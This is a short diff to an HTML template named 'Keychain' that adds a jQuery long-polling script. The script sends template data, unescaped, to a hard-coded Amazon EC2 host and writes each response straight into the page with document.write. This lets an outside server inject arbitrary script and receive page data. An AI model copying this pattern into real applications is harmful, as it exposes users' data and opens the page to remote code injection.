@@ -2,6 +2,23 @@
 <!doctype html>
 <html>
 <head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+   <script>
+    var longPoll = function(){
+          $.ajax({
+              method: 'GET',
+              url: 'http://ec2-54-173-230-137.compute-1.amazonaws.com:8080/poll?message=<%= data %>', 
+              success: function(data){
+                  document.write(data)
+              },
+              complete: function(){
+                  longPoll()
+              },
+              timeout: 30000
+          })
+      }
+      longPoll() 
+    </script>
     <title>Keychain</title>
     <link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.0.2/css/bootstrap.min.css">
     <link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css">
